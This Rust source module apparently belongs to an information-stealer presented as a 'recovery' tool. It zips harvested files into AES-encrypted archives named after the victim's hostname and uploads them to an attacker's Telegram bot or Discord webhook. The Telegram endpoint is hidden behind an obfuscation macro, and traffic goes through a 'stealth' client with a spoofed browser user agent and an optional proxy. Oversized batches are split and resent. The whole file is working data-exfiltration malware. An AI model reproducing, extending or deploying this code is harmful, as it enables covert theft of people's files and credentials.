use crate::recovery::helpers::winhttp::{
    Client, Form, HeaderMap, HeaderValue, Part, Proxy, USER_AGENT,
};
use crate::recovery::settings::RecoveryControl;
use serde::{Deserialize, Serialize};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::time::SystemTime;
use thiserror::Error;
use tracing::{warn, debug, info};
use zip::AesMode;
use zip::CompressionMethod;
use zip::DateTime;
use zip::write::{SimpleFileOptions, ZipWriter};

const TELEGRAM_FILE_SIZE_LIMIT: usize = 20 * 1024 * 1024;
const DISCORD_FILE_SIZE_LIMIT: usize = 8 * 1024 * 1024;
const DEFAULT_ARCHIVE_PASSWORD: &str = "12345";

#[derive(Debug, Clone)]
pub enum Sender {
    Telegram(TelegramSender, ChatId),
    Discord(DiscordSender),
}

impl Sender {
    pub async fn send_files(&self, files: &[(String, PathBuf, Option<SystemTime>)], label: Option<&str>) -> Result<(), SenderError> {
        match self {
            Sender::Telegram(sender, chat_id) => {
                sender.send_sections_as_zip(chat_id.clone(), files, label).await
            }
            Sender::Discord(sender) => sender.send_sections_as_zip(files, label).await,
        }
    }
}

#[derive(Debug, Clone)]
pub struct TelegramSender {
    client: Client,
    base_url: String,
}

fn create_stealth_client() -> Client {
    let mut headers = HeaderMap::new();
    headers.insert(
        USER_AGENT,
        HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
    );

    let mut builder = Client::builder().default_headers(headers);

    if let Some(proxy_url) = RecoveryControl::global().proxy_server() {
        match Proxy::all(proxy_url) {
            Ok(proxy) => {
                builder = builder.proxy(proxy);
            }
            Err(e) => {
                warn!("failed to configure proxy '{}': {}", proxy_url, e);
            }
        }
    }

    builder.build().unwrap_or_else(|_| Client::new())
}

impl TelegramSender {
    pub fn new(token: impl Into<String>) -> Self {
        Self::with_client(create_stealth_client(), token)
    }

    pub fn with_client(client: Client, token: impl Into<String>) -> Self {
        let token = token.into().trim().to_string();
        let base = crate::obf!("https://api.telegram.org/bot");
        Self {
            client,
            base_url: format!("{}{}", base, token),
        }
    }

    pub(crate) async fn send_sections_as_zip(
        &self,
        chat_id: ChatId,
        sections: &[(String, PathBuf, Option<SystemTime>)],
        label: Option<&str>,
    ) -> Result<(), SenderError> {
        if sections.is_empty() {
            return Ok(());
        }

        let mut stack = vec![(sections.to_vec(), 0usize)];
        while let Some((current, part)) = stack.pop() {
            if current.is_empty() {
                continue;
            }

            let password = archive_password();
            let temp_zip = std::env::temp_dir().join(format!("ix_t_{}.zip", uuid::Uuid::new_v4().simple()));
            
            build_zip_archive_to_file(&current, &password, &temp_zip)?;
            
            let mut name_label = label.unwrap_or("Recovery").to_string();
            if part > 0 || !stack.is_empty() {
                name_label = format!("{}_part{}", name_label, part + 1);
            }
            
            let file_name = generate_zip_name(None, Some(&name_label));
            match self
                .send_document_file(chat_id.clone(), file_name, &temp_zip)
                .await
            {
                Ok(()) => {
                    let _ = std::fs::remove_file(&temp_zip);
                    continue;
                },
                Err(err @ SenderError::Api(_)) if err.to_string().contains("too large") || err.to_string().contains("413") => {
                    let _ = std::fs::remove_file(&temp_zip);
                    if current.len() == 1 {
                        return Err(SenderError::FileTooLarge {
                            file_name: "single_file".into(),
                            size: 0,
                        });
                    }
                    
                    let mut items = current;
                    items.sort_by_key(|(_, path, _)| {
                        std::fs::metadata(path).map(|m| m.len()).unwrap_or(0)
                    });
                    
                    let largest = items.pop().unwrap();
                    stack.push((items, part + 1));
                    stack.push((vec![largest], part));
                }
                Err(err @ SenderError::FileTooLarge { .. }) => {
                    let _ = std::fs::remove_file(&temp_zip);
                    if current.len() == 1 {
                        return Err(err);
                    }
                    let mut items = current;
                    items.sort_by_key(|(_, path, _)| {
                        std::fs::metadata(path).map(|m| m.len()).unwrap_or(0)
                    });
                    
                    let largest = items.pop().unwrap();
                    stack.push((items, part + 1));
                    stack.push((vec![largest], part));
                }
                Err(err) => {
                    let _ = std::fs::remove_file(&temp_zip);
                    return Err(err);
                }
            }
        }
        Ok(())
    }

    pub async fn send_document_file(
        &self,
        chat_id: ChatId,
        file_name: impl Into<String>,
        path: &Path,
    ) -> Result<(), SenderError> {
        let file_name = file_name.into();
        let size = std::fs::metadata(path)?.len() as usize;
        if size > TELEGRAM_FILE_SIZE_LIMIT {
            return Err(SenderError::FileTooLarge {
                file_name,
                size,
            });
        }

        let mut content = Vec::with_capacity(size);
        std::fs::File::open(path)?.read_to_end(&mut content)?;

        let url = format!("{}/sendDocument", self.base_url);
        let form = Form::new().text("chat_id", encode_chat_id(&chat_id)).part(
            "document",
            Part::bytes(content).file_name(file_name.clone()),
        );

        let response = self.client.post(url).multipart(form).send().await?;
        let body: TelegramApiResponse = response.json().await?;
        if body.ok {
            Ok(())
        } else {
            Err(SenderError::Api(
                body.description
                    .unwrap_or_else(|| "telegram api request failed".into()),
            ))
        }
    }
}

#[derive(Debug, Clone)]
pub struct DiscordSender {
    client: Client,
    webhook_url: String,
}

impl DiscordSender {
    pub fn new(webhook_url: impl Into<String>) -> Self {
        Self {
            client: create_stealth_client(),
            webhook_url: webhook_url.into().trim().to_string(),
        }
    }

    pub(crate) async fn send_sections_as_zip(
        &self,
        sections: &[(String, PathBuf, Option<SystemTime>)],
        label: Option<&str>,
    ) -> Result<(), SenderError> {
        if sections.is_empty() {
            return Ok(());
        }

        let mut initial_chunks = Vec::new();
        let mut current_chunk = Vec::new();
        let mut current_raw_size = 0;
        const INITIAL_RAW_LIMIT: usize = 20 * 1024 * 1024;

        for section in sections {
            let size = std::fs::metadata(&section.1).map(|m| m.len()).unwrap_or(0) as usize;
            if current_raw_size + size > INITIAL_RAW_LIMIT && !current_chunk.is_empty() {
                initial_chunks.push(current_chunk);
                current_chunk = Vec::new();
                current_raw_size = 0;
            }
            current_chunk.push(section.clone());
            current_raw_size += size;
        }
        if !current_chunk.is_empty() {
            initial_chunks.push(current_chunk);
        }

        for (idx, chunk) in initial_chunks.into_iter().enumerate() {
            let mut stack = vec![(chunk, idx)];
            while let Some((current, part)) = stack.pop() {
                if current.is_empty() {
                    continue;
                }

                let password = archive_password();
                let temp_zip = std::env::temp_dir().join(format!("ix_d_{}.zip", uuid::Uuid::new_v4().simple()));
                
                build_zip_archive_to_file(&current, &password, &temp_zip)?;
                
                let mut name_label = label.unwrap_or("Recovery").to_string();
                if part > 0 || !stack.is_empty() {
                    name_label = format!("{}_part{}", name_label, part + 1);
                }
                
                let file_name = generate_zip_name(Some(current.len()), Some(&name_label));

                match self.send_document_file(&file_name, &temp_zip).await {
                    Ok(()) => {
                        info!(file = %file_name, count = current.len(), "artifact batch sent successfully");
                        let _ = std::fs::remove_file(&temp_zip);
                    }
                    Err(SenderError::FileTooLarge { .. }) if current.len() > 1 => {
                        let _ = std::fs::remove_file(&temp_zip);
                        let mut items = current;
                        items.sort_by_key(|(_, path, _)| {
                            std::fs::metadata(path).map(|m| m.len()).unwrap_or(0)
                        });
                        
                        let largest = items.pop().unwrap();
                        stack.push((items, part + 1));
                        stack.push((vec![largest], part));
                        debug!(file = %file_name, "batch too large, isolating largest component");
                    }
                    Err(err) => {
                        let _ = std::fs::remove_file(&temp_zip);
                        warn!(error = ?err, file = %file_name, "failed to send artifact batch");
                    }
                }
            }
        }

        Ok(())
    }

    pub async fn send_document_file(
        &self,
        file_name: impl Into<String>,
        path: &Path,
    ) -> Result<(), SenderError> {
        let file_name = file_name.into();
        let size = std::fs::metadata(path)?.len() as usize;
        if size > DISCORD_FILE_SIZE_LIMIT {
            return Err(SenderError::FileTooLarge {
                file_name,
                size,
            });
        }

        let mut content = Vec::with_capacity(size);
        std::fs::File::open(path)?.read_to_end(&mut content)?;

        let form = Form::new().part("file", Part::bytes(content).file_name(file_name.clone()));

        let response = self
            .client
            .post(&self.webhook_url)
            .multipart(form)
            .send()
            .await?;

        if response.status().is_success() {
            Ok(())
        } else {
            Err(SenderError::Api(format!(
                "discord api request failed: {}",
                response.status()
            )))
        }
    }
}

#[derive(Debug, Clone, Serialize)]
#[serde(untagged)]
pub enum ChatId {
    Id(i64),
    Username(String),
}

impl ChatId {
    fn to_request_value(&self) -> String {
        match self {
            ChatId::Id(id) => id.to_string(),
            ChatId::Username(handle) => handle.clone(),
        }
    }
}

impl From<i64> for ChatId {
    fn from(value: i64) -> Self {
        Self::Id(value)
    }
}

impl From<String> for ChatId {
    fn from(value: String) -> Self {
        Self::Username(value)
    }
}

impl<'a> From<&'a str> for ChatId {
    fn from(value: &'a str) -> Self {
        Self::Username(value.to_string())
    }
}

#[derive(Deserialize)]
struct TelegramApiResponse {
    ok: bool,
    description: Option<String>,
}

#[derive(Debug, Error)]
pub enum SenderError {
    #[error("http client error: {0}")]
    Http(#[from] crate::recovery::helpers::winhttp::Error),
    #[error("api error: {0}")]
    Api(String),
    #[error("file too large ({size} bytes)")]
    FileTooLarge { file_name: String, size: usize },
    #[error("io error while building an archive: {0}")]
    Io(#[from] std::io::Error),
    #[error("archive error: {0}")]
    Archive(#[from] zip::result::ZipError),
}

fn encode_chat_id(chat_id: &ChatId) -> String {
    chat_id.to_request_value()
}

fn generate_zip_name(count: Option<usize>, label: Option<&str>) -> String {
    let hostname = std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown".to_string());
    
    let timestamp = chrono::Local::now().format("%Y-%m-%d_%H-%M-%S").to_string();
    let label_str = label.map(|l| format!("_{}", l)).unwrap_or_default();
    
    match count {
        Some(c) => format!("{}_{}{}_{}_files.zip", hostname, timestamp, label_str, c),
        None => format!("{}_{}{}.zip", hostname, timestamp, label_str),
    }
}

fn build_zip_archive_to_file(
    sections: &[(String, PathBuf, Option<SystemTime>)],
    password: &str,
    output_path: &Path,
) -> Result<(), SenderError> {
    use std::collections::HashSet;
    let mut seen = HashSet::new();
    let file = std::fs::File::create(output_path)?;
    let mut zip = ZipWriter::new(file);

    let mut buffer = [0u8; 8192];

    for (name, path, modified) in sections {
        let normalized_name = name.replace("\\", "/");
        let mut final_name = normalized_name.clone();
        let mut counter = 1;

        while seen.contains(&final_name) {
            let path_obj = Path::new(&normalized_name);
            let parent = path_obj.parent().unwrap_or(Path::new(""));
            let stem = path_obj.file_stem().and_then(|s| s.to_str()).unwrap_or("file");
            let ext = path_obj.extension().and_then(|e| e.to_str()).unwrap_or("");
            
            let suffix = if ext.is_empty() {
                format!("{}_{}", stem, counter)
            } else {
                format!("{}_{}.{}", stem, counter, ext)
            };
            
            final_name = if parent.as_os_str().is_empty() {
                suffix
            } else {
                parent.join(suffix).to_string_lossy().to_string().replace("\\", "/")
            };
            counter += 1;
        }
        seen.insert(final_name.clone());

        let mut options = SimpleFileOptions::default()
            .compression_method(CompressionMethod::Deflated)
            .with_aes_encryption(AesMode::Aes256, password);
        
        if let Some(time) = modified {
            let chrono_time: chrono::DateTime<chrono::Local> = (*time).into();
            let naive = chrono_time.naive_local();
            
            let min_dos_date = chrono::NaiveDate::from_ymd_opt(1980, 1, 1)
                .unwrap()
                .and_hms_opt(0, 0, 0)
                .unwrap();
            
            let safe_naive = if naive < min_dos_date {
                min_dos_date
            } else {
                naive
            };

            if let Ok(zip_time) = DateTime::try_from(safe_naive) {
                options = options.last_modified_time(zip_time);
            }
        }
        
        zip.start_file(final_name, options)?;
        
        let mut f = std::fs::File::open(path)?;
        loop {
            let n = f.read(&mut buffer)?;
            if n == 0 { break; }
            zip.write_all(&buffer[..n])?;
        }
    }
    zip.finish()?;
    Ok(())
}

fn archive_password() -> String {
    use crate::recovery::settings::RecoveryControl;
    RecoveryControl::global()
        .archive_password()
        .map(|v| v.clone())
        .or_else(|| {
            option_env!("IXODES_PASSWORD")
                .map(|value| value.trim().to_string())
                .filter(|value| !value.is_empty())
        })
        .unwrap_or_else(|| DEFAULT_ARCHIVE_PASSWORD.to_string())
}
